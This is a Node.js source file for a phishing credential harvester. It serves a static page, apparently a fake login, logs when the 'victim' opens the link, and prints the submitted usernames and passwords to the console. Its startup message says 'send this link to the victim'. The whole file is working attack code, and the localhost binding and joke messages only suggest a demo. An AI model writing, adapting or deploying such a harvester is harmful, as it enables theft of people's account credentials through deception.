const fs = require('fs').promises;

//Load HTTP module
const http = require("http");
const hostname = '127.0.0.1';
const port = 3000;

//Create HTTP server and listen on port 3000 for requests
const server = http.createServer((req, res) => {
    if (req.method == "GET") {
        console.warn("\nvictim clicked on link.");
        console.warn("waiting for password...");

        fs.readFile(__dirname + "/static/index.html").then((content)=>{
            //Set the response HTTP header with HTTP status and Content type
            res.statusCode = 200;
            res.setHeader('Content-Type', 'text/html');
            res.end(content);
        });
    } else if (req.method == "POST") {
        console.warn("user sent in data:");
        let data = '';
        req.on('data', chunk => {
            data += chunk;
        });
        req.on('end', () => {
            data = JSON.parse(data);
            if (data.yoinked) {
                console.log("already yoinked\n");
            } else {
                console.error("\nusername: " + data.username +  "\npassword: " + data.password + "\n");
                console.log("Jeepers scoob! Like he got totally yoinked!\n");
            }
        });
    }
});

//listen for request on port 3000, and as a callback function have the port listened on logged
server.listen(port, hostname, () => {
  console.log(`send this link to the victim: http://${hostname}:${port}/\n`);
  console.log("waiting for the user to click on the link...");
});
